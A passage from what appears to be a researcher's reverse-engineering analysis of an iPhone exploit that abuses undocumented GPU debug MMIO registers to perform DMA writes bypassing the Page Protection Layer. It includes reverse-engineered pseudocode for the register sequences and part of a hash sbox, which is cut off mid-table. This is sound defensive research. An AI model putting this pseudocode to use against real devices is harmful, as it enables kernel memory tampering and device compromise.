<p>I decided to take a closer look at how the exploit operated these unknown MMIO registers. The register 0x206040000 stands out from all the others because it is located in a separate MMIO block from all the other registers. It is touched only during the initialization and finalization stages of the exploit: it is the first register to be set during initialization and the last one, during finalization. From my experience, it was clear that the register either enabled/disabled the hardware feature used by the exploit or controlled interrupts. I started to follow the interrupt route, and fairly soon, I was able to recognize this unknown register, 0x206040000, and also discovered what exactly was mapped to the address range of 0x206000000–0x206050000. Below, you can see the reverse-engineered code of the exploit that I was able to recognize. I have given it a proper name.</p>
		<div id="crayon-658c436cedc82259056594" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p></div>
				</td>
						<td><div><p><span>def </span><span>ml_dbgwrap_halt_cpu</span><span>(</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>value</span><span> </span>=<span> </span><span>read_qword</span><span>(</span><span>0x206040000</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>(</span><span>(</span><span>value</span><span> </span>&amp;<span> </span><span>0x90000000</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>return</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>write_qword</span><span>(</span><span>0x206040000</span><span>,</span><span> </span><span>value</span><span> </span><span>|</span><span> </span><span>0x80000000</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>while</span><span> </span><span>(</span><span>True</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>(</span><span>(</span><span>read_qword</span><span>(</span><span>0x206040000</span><span>)</span><span> </span>&amp;<span> </span><span>0x10000000</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>break</span></p><p><span>def </span><span>ml_dbgwrap_unhalt_cpu</span><span>(</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>value</span><span> </span>=<span> </span><span>read_qword</span><span>(</span><span>0x206040000</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>value</span><span> </span>=<span> </span><span>(</span><span>value</span><span> </span>&amp;<span> </span><span>0xFFFFFFFF2FFFFFFF</span><span>)</span><span> </span><span>|</span><span> </span><span>0x40000000</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>write_qword</span><span>(</span><span>0x206040000</span><span>,</span><span> </span><span>value</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>while</span><span> </span><span>(</span><span>True</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>(</span><span>(</span><span>read_qword</span><span>(</span><span>0x206040000</span><span>)</span><span> </span>&amp;<span> </span><span>0x10000000</span><span>)</span><span> </span>==<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>break</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p><em>Pseudocode for the usage of the, 0x206040000 register by the exploit</em></p>
<p>I was able to match the ml_dbgwrap_halt_cpu function from the pseudocode above to a function with the same name in the dbgwrap.c file of the XNU source code. This file contains code for working with the ARM <a href="https://developer.arm.com/Architectures/CoreSight%20Architecture" target="_blank" rel="noopener">CoreSight</a> MMIO debug registers of the main CPU. The source code states that there are four CoreSight-related MMIO regions, named ED, CTI, PMU, and UTT. Each &nbsp;occupies 0x10000 bytes, and they are all located next to one another. The ml_dbgwrap_halt_cpu function uses the UTT region, and the source code states that, unlike the other three, it does not come from ARM, but is a proprietary Apple feature that was added just for convenience.</p>
<p>I was able to confirm that 0x206000000–0x206050000 was indeed a block of CoreSight MMIO debug registers for the GPU coprocessor by writing ARM_DBG_LOCK_ACCESS_KEY to the corresponding location. Each core of the main CPU has its own block of CoreSight MMIO debug registers, but unlike the GPU coprocessor, their addresses can be found in the device tree.</p>
<p>It is also interesting that the author(s) of this exploit knew how to use the proprietary Apple UTT region to unhalt the CPU: this code is not part of the XNU source code. Perhaps it is fair to say that this could easily be found out through experimentation.</p>
<p>Something that cannot be found that way is what the attackers did with the registers in the second unknown region. I am not sure what blocks of MMIO debug registers are located there, or how the attackers found out how to use them if they were not used by the firmware.</p>
<p>Let us look at the remaining unknown registers used by the exploit.</p>
<p>The registers 0x206140008 and 0x206140108 control enabling/disabling and running the hardware feature used by the exploit.</p>
		<div id="crayon-658c436cedc84901682722" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p><p>47</p><p>48</p></div>
				</td>
						<td><div><p><span>def </span><span>dma_ctrl_1</span><span>(</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>ctrl</span><span> </span>=<span> </span><span>0x206140108</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>value</span><span> </span>=<span> </span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>write_qword</span><span>(</span><span>ctrl</span><span>,</span><span> </span><span>value</span><span> </span><span>|</span><span> </span><span>0x8000000000000001</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>sleep</span><span>(</span><span>1</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>while</span><span> </span><span>(</span><span>(</span><span>~</span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span><span> </span>&amp;<span> </span><span>0x8000000000000001</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>sleep</span><span>(</span><span>1</span><span>)</span></p><p><span>def </span><span>dma_ctrl_2</span><span>(</span><span>flag</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>ctrl</span><span> </span>=<span> </span><span>0x206140008</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>value</span><span> </span>=<span> </span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>(</span><span>flag</span><span>)</span><span>:</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>(</span><span>(</span><span>value</span><span> </span>&amp;<span> </span><span>0x1000000000000000</span><span>)</span><span> </span>==<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>value</span><span> </span>=<span> </span><span>value</span><span> </span><span>|</span><span> </span><span>0x1000000000000000</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>write_qword</span><span>(</span><span>ctrl</span><span>,</span><span> </span><span>value</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>else</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>if</span><span> </span><span>(</span><span>(</span><span>value</span><span> </span>&amp;<span> </span><span>0x1000000000000000</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>value</span><span> </span>=<span> </span><span>value</span><span> </span>&amp;<span> </span><span>~</span><span>0x1000000000000000</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>write_qword</span><span>(</span><span>ctrl</span><span>,</span><span> </span><span>value</span><span>)</span></p><p><span>def </span><span>dma_ctrl_3</span><span>(</span><span>value</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>ctrl</span><span> </span>=<span> </span><span>0x206140108</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>value</span><span> </span>=<span> </span><span>value</span><span> </span><span>|</span><span> </span><span>0x8000000000000000</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>write_qword</span><span>(</span><span>ctrl</span><span>,</span><span> </span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span><span> </span>&amp;<span> </span><span>value</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>while</span><span> </span><span>(</span><span>(</span><span>read_qword</span><span>(</span><span>ctrl</span><span>)</span><span> </span>&amp;<span> </span><span>0x8000000000000001</span><span>)</span><span> </span><span>!</span>=<span> </span><span>0</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span>sleep</span><span>(</span><span>1</span><span>)</span></p><p><span>def </span><span>dma_init</span><span>(</span><span>original_value_0x206140108</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>dma_ctrl_1</span><span>(</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>dma_ctrl_2</span><span>(</span><span>False</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>dma_ctrl_3</span><span>(</span><span>original_value_0x206140108</span><span>)</span></p><p><span>def </span><span>dma_done</span><span>(</span><span>original_value_0x206140108</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>dma_ctrl_1</span><span>(</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>dma_ctrl_2</span><span>(</span><span>True</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>dma_ctrl_3</span><span>(</span><span>original_value_0x206140108</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p><em>Pseudocode for the usage of the </em>0x206140008 and 0x206140108<em> registers by the exploit</em></p>
<p>The register 0x206150020 is used only for Apple A15/A16 Bionic SoCs. It is set to 1 during the initialization stage of the exploit, and to its original value, during the finalization stage.</p>
<p>The register 0x206150040 is used to store some flags and the lower half of the destination physical address.</p>
<p>The last register, 0x206150048, is used for storing the data that needs to be written and the upper half of the destination physical address, bundled together with the data hash and another value (possibly a command). This hardware feature writes the data in aligned blocks of 0x40 bytes, and everything should be written to the 0x206150048 register in nine sequential writes.</p>
		<div id="crayon-658c436cedc85011028664" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p></div>
				</td>
						<td><div><p><span>if</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x8765EDEA</span><span>)</span><span>:</span><span>&nbsp;&nbsp; </span><span># CPUFAMILY_ARM_EVEREST_SAWTOOTH (A16)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>i</span><span> </span>=<span> </span><span>8</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>mask</span><span> </span>=<span> </span><span>0x7FFFFFF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0xDA33D83D</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_AVALANCHE_BLIZZARD (A15)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>i</span><span> </span>=<span> </span><span>8</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>mask</span><span> </span>=<span> </span><span>0x3FFFFF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x1B588BB3</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_FIRESTORM_ICESTORM (A14)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>i</span><span> </span>=<span> </span><span>0x28</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>mask</span><span> </span>=<span> </span><span>0x3FFFFF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x462504D2</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_LIGHTNING_THUNDER (A13)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>i</span><span> </span>=<span> </span><span>0x28</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>mask</span><span> </span>=<span> </span><span>0x3FFFFF</span></p><p><span>elif</span><span> </span><span>(</span><span>cpuid</span><span> </span>==<span> </span><span>0x07D34B9F</span><span>)</span><span>:</span><span> </span><span># CPUFAMILY_ARM_VORTEX_TEMPEST (A12)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>i</span><span> </span>=<span> </span><span>0x28</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>mask</span><span> </span>=<span> </span><span>0x3FFFFF</span></p><p><span>dma_init</span><span>(</span><span>original_value_0x206140108</span><span>)</span></p><p><span>hash1</span><span> </span>=<span> </span><span>calculate_hash</span><span>(</span><span>data</span><span>)</span></p><p><span>hash2</span><span> </span>=<span> </span><span>calculate_hash</span><span>(</span><span>data</span>+<span>0x20</span><span>)</span></p><p><span>write_qword</span><span>(</span><span>0x206150040</span><span>,</span><span> </span><span>0x2000000</span><span> </span><span>|</span><span> </span><span>(</span><span>phys_addr</span><span> </span>&amp;<span> </span><span>0x3FC0</span><span>)</span><span>)</span></p><p><span>pos</span><span> </span>=<span> </span><span>0</span></p><p><span>while</span><span> </span><span>(</span><span>pos</span><span> </span><span>&lt;</span><span> </span><span>0x40</span><span>)</span><span>:</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>write_qword</span><span>(</span><span>0x206150048</span><span>,</span><span> </span><span>read_qword</span><span>(</span><span>data</span><span> </span>+<span> </span><span>pos</span><span>)</span><span>)</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>pos</span><span> </span>+=<span> </span><span>8</span></p><p><span>phys_addr_upper</span><span> </span>=<span> </span><span>(</span><span>(</span><span>(</span><span>(</span><span>phys_addr</span><span> </span><span>&gt;</span><span>&gt;</span><span> </span><span>14</span><span>)</span><span> </span>&amp;<span> </span><span>mask</span><span>)</span><span> </span><span>&lt;</span><span>&lt;</span><span> </span><span>18</span><span>)</span><span> </span>&amp;<span> </span><span>0x3FFFFFFFFFFFF</span><span>)</span></p><p><span>value</span><span> </span>=<span> </span><span>phys_addr_upper</span><span> </span><span>|</span><span> </span><span>(</span><span>hash1</span><span> </span><span>&lt;</span><span>&lt;</span><span> </span><span>i</span><span>)</span><span> </span><span>|</span><span> </span><span>(</span><span>hash2</span><span> </span><span>&lt;</span><span>&lt;</span><span> </span><span>50</span><span>)</span><span> </span><span>|</span><span> </span><span>0x1F</span></p><p><span>write_qword</span><span>(</span><span>0x206150048</span><span>,</span><span> </span><span>value</span><span>)</span></p><p><span>dma_done</span><span>(</span><span>original_value_0x206140108</span><span>)</span></p></div></td>
					</tr>
				</tbody></table>
			</div><p><em>Pseudocode for the usage of the 0x206150040 and 0x206150048 registers by the exploit</em></p>
<p>As long as everything is done correctly, the hardware should perform a direct memory access (DMA) operation and write the data to the requested location.</p>
<p>The exploit uses this hardware feature as a Page Protection Layer (PPL) bypass, mainly for patching page table entries. It can also be used for patching the data in the protected __PPLDATA segment. The exploit does not use the feature to patch the kernel code, but once during a test, I was able to overwrite an instruction in the __TEXT_EXEC segment of the kernel and get an “Undefined Kernel Instruction” panic with the expected address and value. This only worked once—the other times I tried I got an AMCC panic. I have an idea about what I did right that one time it worked, and I am planning to look deeper into this in the future, because I think it would be really cool to take a vulnerability that was used to harm us and use it for something good, like enabling kernel debugging on new iPhones.</p>
<p>Now that all the work with all the MMIO registers has been covered, let us take a look at one last thing: how hashes are calculated. The algorithm is shown below.</p>
		<div id="crayon-658c436cedc87471921304" data-settings=" minimize scroll-mouseover">
				<table>
					<tbody><tr>
				<td data-settings="show">
					<div><p>1</p><p>2</p><p>3</p><p>4</p><p>5</p><p>6</p><p>7</p><p>8</p><p>9</p><p>10</p><p>11</p><p>12</p><p>13</p><p>14</p><p>15</p><p>16</p><p>17</p><p>18</p><p>19</p><p>20</p><p>21</p><p>22</p><p>23</p><p>24</p><p>25</p><p>26</p><p>27</p><p>28</p><p>29</p><p>30</p><p>31</p><p>32</p><p>33</p><p>34</p><p>35</p><p>36</p><p>37</p><p>38</p><p>39</p><p>40</p><p>41</p><p>42</p><p>43</p><p>44</p><p>45</p><p>46</p></div>
				</td>
						<td><div><p><span>sbox</span><span> </span>=<span> </span><span>[</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x007</span><span>,</span><span> </span><span>0x00B</span><span>,</span><span> </span><span>0x00D</span><span>,</span><span> </span><span>0x013</span><span>,</span><span> </span><span>0x00E</span><span>,</span><span> </span><span>0x015</span><span>,</span><span> </span><span>0x01F</span><span>,</span><span> </span><span>0x016</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x019</span><span>,</span><span> </span><span>0x023</span><span>,</span><span> </span><span>0x02F</span><span>,</span><span> </span><span>0x037</span><span>,</span><span> </span><span>0x04F</span><span>,</span><span> </span><span>0x01A</span><span>,</span><span> </span><span>0x025</span><span>,</span><span> </span><span>0x043</span><span>,</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x03B</span><span>,</span><span> </span><span>0x057</span><span>,</span><span> </span><span>0x08F</span><span>,</span><span> </span><span>0x01C</span><span>,</span><span> </span><span>0x026</span><span>,</span><span> </span><span>0x029</span><span>,</span><span> </span><span>0x03D</span><span>,</span><span> </span><span>0x045</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x05B</span><span>,</span><span> </span><span>0x083</span><span>,</span><span> </span><span>0x097</span><span>,</span><span> </span><span>0x03E</span><span>,</span><span> </span><span>0x05D</span><span>,</span><span> </span><span>0x09B</span><span>,</span><span> </span><span>0x067</span><span>,</span><span> </span><span>0x117</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x02A</span><span>,</span><span> </span><span>0x031</span><span>,</span><span> </span><span>0x046</span><span>,</span><span> </span><span>0x049</span><span>,</span><span> </span><span>0x085</span><span>,</span><span> </span><span>0x103</span><span>,</span><span> </span><span>0x05E</span><span>,</span><span> </span><span>0x09D</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x06B</span><span>,</span><span> </span><span>0x0A7</span><span>,</span><span> </span><span>0x11B</span><span>,</span><span> </span><span>0x217</span><span>,</span><span> </span><span>0x09E</span><span>,</span><span> </span><span>0x06D</span><span>,</span><span> </span><span>0x0AB</span><span>,</span><span> </span><span>0x0C7</span><span>,</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x127</span><span>,</span><span> </span><span>0x02C</span><span>,</span><span> </span><span>0x032</span><span>,</span><span> </span><span>0x04A</span><span>,</span><span> </span><span>0x051</span><span>,</span><span> </span><span>0x086</span><span>,</span><span> </span><span>0x089</span><span>,</span><span> </span><span>0x105</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x203</span><span>,</span><span> </span><span>0x06E</span><span>,</span><span> </span><span>0x0AD</span><span>,</span><span> </span><span>0x12B</span><span>,</span><span> </span><span>0x147</span><span>,</span><span> </span><span>0x227</span><span>,</span><span> </span><span>0x034</span><span>,</span><span> </span><span>0x04C</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x052</span><span>,</span><span> </span><span>0x076</span><span>,</span><span> </span><span>0x08A</span><span>,</span><span> </span><span>0x091</span><span>,</span><span> </span><span>0x0AE</span><span>,</span><span> </span><span>0x106</span><span>,</span><span> </span><span>0x109</span><span>,</span><span> </span><span>0x0D3</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x12D</span><span>,</span><span> </span><span>0x205</span><span>,</span><span> </span><span>0x22B</span><span>,</span><span> </span><span>0x247</span><span>,</span><span> </span><span>0x07A</span><span>,</span><span> </span><span>0x0D5</span><span>,</span><span> </span><span>0x153</span><span>,</span><span> </span><span>0x22D</span><span>,</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x038</span><span>,</span><span> </span><span>0x054</span><span>,</span><span> </span><span>0x08C</span><span>,</span><span> </span><span>0x092</span><span>,</span><span> </span><span>0x061</span><span>,</span><span> </span><span>0x10A</span><span>,</span><span> </span><span>0x111</span><span>,</span><span> </span><span>0x206</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x209</span><span>,</span><span> </span><span>0x07C</span><span>,</span><span> </span><span>0x0BA</span><span>,</span><span> </span><span>0x0D6</span><span>,</span><span> </span><span>0x155</span><span>,</span><span> </span><span>0x193</span><span>,</span><span> </span><span>0x253</span><span>,</span><span> </span><span>0x28B</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x307</span><span>,</span><span> </span><span>0x0BC</span><span>,</span><span> </span><span>0x0DA</span><span>,</span><span> </span><span>0x156</span><span>,</span><span> </span><span>0x255</span><span>,</span><span> </span><span>0x293</span><span>,</span><span> </span><span>0x30B</span><span>,</span><span> </span><span>0x058</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x094</span><span>,</span><span> </span><span>0x062</span><span>,</span><span> </span><span>0x10C</span><span>,</span><span> </span><span>0x112</span><span>,</span><span> </span><span>0x0A1</span><span>,</span><span> </span><span>0x20A</span><span>,</span><span> </span><span>0x211</span><span>,</span><span> </span><span>0x0DC</span><span>,</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x196</span><span>,</span><span> </span><span>0x199</span><span>,</span><span> </span><span>0x256</span><span>,</span><span> </span><span>0x165</span><span>,</span><span> </span><span>0x259</span><span>,</span><span> </span><span>0x263</span><span>,</span><span> </span><span>0x30D</span><span>,</span><span> </span><span>0x313</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x098</span><span>,</span><span> </span><span>0x064</span><span>,</span><span> </span><span>0x114</span><span>,</span><span> </span><span>0x0A2</span><span>,</span><span> </span><span>0x15C</span><span>,</span><span> </span><span>0x0EA</span><span>,</span><span> </span><span>0x20C</span><span>,</span><span> </span><span>0x0C1</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x121</span><span>,</span><span> </span><span>0x212</span><span>,</span><span> </span><span>0x166</span><span>,</span><span> </span><span>0x19A</span><span>,</span><span> </span><span>0x299</span><span>,</span><span> </span><span>0x265</span><span>,</span><span> </span><span>0x2A3</span><span>,</span><span> </span><span>0x315</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x0EC</span><span>,</span><span> </span><span>0x1A6</span><span>,</span><span> </span><span>0x29A</span><span>,</span><span> </span><span>0x266</span><span>,</span><span> </span><span>0x1A9</span><span>,</span><span> </span><span>0x269</span><span>,</span><span> </span><span>0x319</span><span>,</span><span> </span><span>0x2C3</span><span>,</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x323</span><span>,</span><span> </span><span>0x068</span><span>,</span><span> </span><span>0x0A4</span><span>,</span><span> </span><span>0x118</span><span>,</span><span> </span><span>0x0C2</span><span>,</span><span> </span><span>0x122</span><span>,</span><span> </span><span>0x214</span><span>,</span><span> </span><span>0x141</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x221</span><span>,</span><span> </span><span>0x0F4</span><span>,</span><span> </span><span>0x16C</span><span>,</span><span> </span><span>0x1AA</span><span>,</span><span> </span><span>0x2A9</span><span>,</span><span> </span><span>0x325</span><span>,</span><span> </span><span>0x343</span><span>,</span><span> </span><span>0x0F8</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x174</span><span>,</span><span> </span><span>0x1AC</span><span>,</span><span> </span><span>0x2AA</span><span>,</span><span> </span><span>0x326</span><span>,</span><span> </span><span>0x329</span><span>,</span><span> </span><span>0x345</span><span>,</span><span> </span><span>0x383</span><span>,</span><span> </span><span>0x070</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x0A8</span><span>,</span><span> </span><span>0x0C4</span><span>,</span><span> </span><span>0x124</span><span>,</span><span> </span><span>0x218</span><span>,</span><span> </span><span>0x142</span><span>,</span><span> </span><span>0x222</span><span>,</span><span> </span><span>0x181</span><span>,</span><span> </span><span>0x241</span><span>,</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x178</span><span>,</span><span> </span><span>0x2AC</span><span>,</span><span> </span><span>0x32A</span><span>,</span><span> </span><span>0x2D1</span><span>,</span><span> </span><span>0x0B0</span><span>,</span><span> </span><span>0x0C8</span><span>,</span><span> </span><span>0x128</span><span>,</span><span> </span><span>0x144</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x1B8</span><span>,</span><span> </span><span>0x224</span><span>,</span><span> </span><span>0x1D4</span><span>,</span><span> </span><span>0x182</span><span>,</span><span> </span><span>0x242</span><span>,</span><span> </span><span>0x2D2</span><span>,</span><span> </span><span>0x32C</span><span>,</span><span> </span><span>0x281</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x351</span><span>,</span><span> </span><span>0x389</span><span>,</span><span> </span><span>0x1D8</span><span>,</span><span> </span><span>0x2D4</span><span>,</span><span> </span><span>0x352</span><span>,</span><span> </span><span>0x38A</span><span>,</span><span> </span><span>0x391</span><span>,</span><span> </span><span>0x0D0</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x130</span><span>,</span><span> </span><span>0x148</span><span>,</span><span> </span><span>0x228</span><span>,</span><span> </span><span>0x184</span><span>,</span><span> </span><span>0x244</span><span>,</span><span> </span><span>0x282</span><span>,</span><span> </span><span>0x301</span><span>,</span><span> </span><span>0x1E4</span><span>,</span><span> </span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x2D8</span><span>,</span><span> </span><span>0x354</span><span>,</span><span> </span><span>0x38C</span><span>,</span><span> </span><span>0x392</span><span>,</span><span> </span><span>0x1E8</span><span>,</span><span> </span><span>0x2E4</span><span>,</span><span> </span><span>0x358</span><span>,</span><span> </span><span>0x394</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x362</span><span>,</span><span> </span><span>0x3A1</span><span>,</span><span> </span><span>0x150</span><span>,</span><span> </span><span>0x230</span><span>,</span><span> </span><span>0x188</span><span>,</span><span> </span><span>0x248</span><span>,</span><span> </span><span>0x284</span><span>,</span><span> </span><span>0x302</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x1F0</span><span>,</span><span> </span><span>0x2E8</span><span>,</span><span> </span><span>0x364</span><span>,</span><span> </span><span>0x398</span><span>,</span><span> </span><span>0x3A2</span><span>,</span><span> </span><span>0x0E0</span><span>,</span><span> </span><span>0x190</span><span>,</span><span> </span><span>0x250</span><span>,</span></p><p><span>&nbsp;&nbsp;&nbsp;&nbsp;</span><span>0x2F0</span><span>,</span><span> </span><span>0x288</span><span>,</span><span> </span><span>0x368</span><span>,</span><span> </span><span>0x304</span><span>,</span><span> 